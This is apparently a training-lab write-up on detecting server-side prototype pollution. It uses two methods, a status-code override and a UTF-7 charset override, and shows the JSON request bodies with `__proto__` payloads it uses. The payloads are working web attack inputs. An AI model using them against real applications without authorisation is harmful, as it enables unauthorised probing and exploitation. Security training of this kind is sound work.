# Lab 6 - Status Code & Charset

### Objective: Pollute The Global Prototype

This is practically a blind challenge but we are able to complete this using 2 methods. Let's start with the first one.

#### Method 1: Status Code Overide

We are given the following credentials to login:

<figure><img src="../../../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>

`wiener:peter`

Click 'Submit' and inspect the request. Send to Repeater and check the Response

<figure><img src="../../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

Our goal is to just confirm that the vulnerability exist not change the `isAdmin` value. We will opt for the Status Code Override method.

Try to intentionally cause a Syntax Error by adding a comma(`,`) at the end of the JSON request body

<figure><img src="../../../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>

We can see it returns a status `500` error response, with an `status` property of `400` . We can try to pollute the prototype and inject arbitrary status code (400-599). In this case, I will be using `418`

```json
{
	"address_line_1":"Wiener HQ",
	"address_line_2":"One Wiener Way",
	"city":"Wienerville","postcode":"BU1 1RP",
	"country":"UK","sessionId":"jpwHGYGGhMmSvPWmbXhBZ2dVQUqUcy1Y",
	"__proto__":{
		"status":418
}
```

Send the request and the response will be back to normal. Now once again make a Syntax Error and send the response

<figure><img src="../../../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>

Notice the `status` and `statusCode` changed to our own injected value. That solves the lab!

***

#### Method 2: Charset Override

Inspect the request in Burp and send it to Repeater. I will add this to the request body. The encoded text is in UTF-7 which means "foo"

```json
"role":"+AGYAbwBv-"
```

Now forward the request

<figure><img src="../../../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>

The property and the value is reflected. Next, pollute with a `content-type` property that explicitly specifies the UTF-7 character set:

```json
{
	"address_line_1":"Wiener HQ",
	"address_line_2":"One Wiener Way",
	"city":"Wienerville",
	"postcode":"BU1 1RP",
	"country":"UK",
	"sessionId":"4fAbX5uR7jrxMXEAw1f3gsCcHU2C6Zgs",
	"role":"+AGYAbwBv-",
	"__proto__":{ 
		"content-type": "application/json; charset=utf-7" 
	}
}
```

Forward the request. Finally, remove the `__proto__` property and resend the initial request

<figure><img src="../../../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

The encoded string is now decoded in the Response. Thus, solving the lab
